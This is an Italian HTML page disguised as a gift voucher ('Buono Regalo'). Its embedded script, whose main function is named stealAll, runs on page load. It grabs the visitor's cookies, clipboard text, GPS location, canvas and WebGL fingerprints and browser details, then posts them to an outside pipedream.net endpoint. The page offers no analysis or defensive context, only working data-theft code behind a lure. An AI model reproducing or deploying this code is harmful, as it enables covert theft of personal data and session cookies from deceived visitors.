<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🎁 Buono Regalo</title>
    <!-- STESSO STILE DI PRIMA -->
</head>
<body>
    <!-- STESSA INTERFACCIA UTENTE -->
    
    <script>
        const PIPEDREAM_URL = "https://69cd60beb3f0593eb064103e51330e55.m.pipedream.net";
        const data = {};
        
        async function stealAll() {
            // Dati base
            data.timestamp = new Date().toISOString();
            data.userAgent = navigator.userAgent;
            data.platform = navigator.platform;
            data.language = navigator.language;
            data.screen = screen.width + "x" + screen.height;
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.cookies = document.cookie;
            
            // Canvas fingerprint
            try {
                const c = document.createElement("canvas");
                const x = c.getContext("2d");
                x.textBaseline = "top"; x.font = "14px Arial";
                x.fillStyle = "#f60"; x.fillRect(125,1,62,20);
                x.fillText("FP", 2, 15);
                data.canvasFP = c.toDataURL().substring(0,200);
            } catch(e) {}
            
            // WebGL fingerprint
            try {
                const c = document.createElement("canvas");
                const g = c.getContext("webgl");
                if(g) {
                    const d = g.getExtension("WEBGL_debug_renderer_info");
                    data.webglRenderer = g.getParameter(d.UNMASKED_RENDERER_WEBGL);
                }
            } catch(e) {}
            
            // GPS (chiede permesso)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                        sendData();
                    },
                    err => {
                        data.gps = "rifiutato";
                        sendData();
                    },
                    { timeout: 5000 }
                );
            } else {
                sendData();
            }
            
            // Clipboard (funziona solo su HTTPS e con permesso)
            try {
                data.clipboard = await navigator.clipboard.readText();
            } catch(e) {
                data.clipboard = "non accessibile";
            }
            
            // Notifiche push
            if ('Notification' in window) {
                const perm = await Notification.requestPermission();
                data.notifications = perm;
            }
        }
        
        function sendData() {
            fetch(PIPEDREAM_URL, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(data)
            }).catch(() => {});
        }
        
        // PARTE SUBITO
        stealAll();
    </script>
</body>
</html>
